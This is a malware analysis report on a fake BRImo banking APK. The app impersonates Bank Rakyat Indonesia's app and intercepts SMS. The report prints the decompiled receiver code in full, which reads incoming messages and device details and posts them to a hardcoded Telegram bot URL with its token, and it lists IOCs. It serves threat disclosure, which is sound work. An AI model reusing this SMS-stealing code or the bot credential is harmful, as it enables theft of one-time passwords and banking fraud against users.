# 🐟 Malware Analysis Report: Fake BRImo.apk

## 🔍 Summary
This analysis covers a fake version of the BRImo.apk, impersonating the legitimate mobile banking app from Bank Rakyat Indonesia (BRI). Unlike the official app, this variant was found outside authorized app stores and exhibits malicious behavior including SMS interception and data exfiltration via Telegram API.

---

## 📦 File Information

- **Filename:** BRImo.apk
- **SHA-256:** `013C8C4518012386F419E4CCA1E78B3F09D3E87B290E87E4093A92BD6ED1175D`
- **Package Name:** `com.smodj.app.smstotelegram`
- **Size:** ~5MB (exact size may vary)
- **Detection:** Manual Detection using Tools.

---

## 📱 Requested Permissions

```xml
<uses-permission android:name="android.permission.INTERNET"/>
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
<uses-permission android:name="android.permission.RECEIVE_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
```
These permissions are red flags, especially for an app claiming to be a banking application, as it allows reading and intercepting user SMS messages.

## 🔐 Hardcoded Secrets (Telegram Bot API)
```xml
private static final String bot_id = "138892312:AAEJMlbP84LiMYcuHCZKz9kCr_LwrCo81A0";
public static final String telegram_url = "https://api.telegram.org/bot138892312:AAEJMlbP84LiMYcuHCZKz9kCr_LwrCo81A0/sendMessage";
```
## 🕵️ Malicious Behavior Overview 
```xml
public class SMSBroadcastReader extends BroadcastReceiver {
    final SmsManager sms = SmsManager.getDefault();

    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        String senderNum = "";
        String message = "";
        if (bundle != null) {
            try {
                Object[] pdusObj = (Object[]) bundle.get("pdus");
                for (Object obj : pdusObj) {
                    SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) obj);
                    senderNum = currentMessage.getDisplayOriginatingAddress();
                    message = message + currentMessage.getDisplayMessageBody();
                }
                Storage read = new Storage(context);
                String telegram_id = read.read(MainConstant.telegram_id_storage_key);
                SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(context);
                String device_name = settings.getString("DeviceName", "Default");
                if (device_name.equals("Default")) {
                    device_name = Build.MANUFACTURER + "|" + Build.MODEL;
                }
                String msg = "From: " + senderNum + "\nDevice Info: " + device_name + "\nMessage:\n" + message;
                StackMessages stack = new StackMessages(context);
                if (stack.getStack() != null) {
                    Set<String> unsentMsgs = stack.getStack();
                    for (String unsentMsg : unsentMsgs) {
                        sendToTelegramAPI(context, telegram_id, unsentMsg, MainConstant.telegram_url, stack);
                    }
                    sendToTelegramAPI(context, telegram_id, msg, MainConstant.telegram_url, stack);
                    stack.clearStack();
                    return;
                }
                sendToTelegramAPI(context, telegram_id, msg, MainConstant.telegram_url, stack);
            } catch (Exception e) {
                Log.e("SmsReceiver", "Exception smsReceiver" + e);
            }
        }
    }

    private void sendToTelegramAPI(Context context, final String telegram_id, final String msg, String url, final StackMessages stack) {
        RequestQueue queue = Volley.newRequestQueue(context);
        StringRequest stringRequest = new StringRequest(1, url, new Response.Listener<String>() { // from class: com.smodj.app.smstotelegram.SMSBroadcastReader.1
            @Override // com.android.volley.Response.Listener
            public void onResponse(String response) {
                Log.d("Response", response);
            }
        }, new Response.ErrorListener() { // from class: com.smodj.app.smstotelegram.SMSBroadcastReader.2
            @Override // com.android.volley.Response.ErrorListener
            public void onErrorResponse(VolleyError error) {
                Log.d("VolleyError", "That didn't work!");
                stack.addToStack(msg);
            }
        }) { // from class: com.smodj.app.smstotelegram.SMSBroadcastReader.3
            @Override // com.android.volley.Request
            protected Map<String, String> getParams() throws AuthFailureError {
                Map<String, String> params = new HashMap<>();
                params.put("chat_id", telegram_id);
                params.put("text", msg);
                return params;
            }
        };
        queue.add(stringRequest);
    }
}
```
- Collects SMS sender and message
- Reads device info (manufacturer + model)
- Sends the data to Telegram using sendMessage API
- Messages are optionally stacked and resent if previous attempts failed

## 🧠 App Settings (Suspicious UI Fragments)
```xml
<PreferenceScreen>
    <EditTextPreference
        android:title="Device Name"
        android:key="DeviceName"
        android:summary="Your current device name."
        android:defaultValue="Default"/>
</PreferenceScreen>
```

## 🛑 Indicators of Compromise (IOCs)

- Package Name : com.smodj.app.smstotelegram
- Bot API URL	: https://api.telegram.org/bot138892312:AAEJMlbP84LiMYcuHCZKz9kCr_LwrCo81A0/sendMessage
- Permissions	: RECEIVE_SMS, READ_SMS, INTERNET
- SHA256 : 013C8C4518012386F419E4CCA1E78B3F09D3E87B290E87E4093A92BD6ED1175D
